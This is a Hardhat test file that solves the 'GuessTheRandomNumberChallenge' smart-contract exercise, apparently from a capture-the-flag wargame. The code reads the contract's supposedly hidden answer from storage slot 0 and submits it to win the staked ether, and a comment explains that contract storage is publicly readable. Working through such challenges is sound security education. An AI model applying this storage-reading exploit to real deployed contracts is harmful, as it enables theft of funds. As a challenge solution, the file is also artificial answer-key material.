import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    /**
     * In Solidity, all state variables are stored in storage slots. For this contract, the variable answer is the only state
     * variable and will be stored in slot 0. This means the value of answer can be accessed directly from the blockchain’s storage
     * using the `getStorageAt()` method.
     * Storage Slots: Solidity stores contract state variables in 32-byte slots.
     *  The first state variable (in this case, `answer`) is stored in the first slot, which is slot 0.
     * Publicly accessible storage: Although the contract does not provide a public getter for answer,
     *  all storage on Ethereum is publicly accessible if you query it directly.
     */
    const answer = await provider.getStorageAt(target.address, 0);
    await target.connect(attacker).guess(answer, {
      value: utils.parseEther('1'),
    });

    expect(await target.isComplete()).to.equal(true);
  });
});
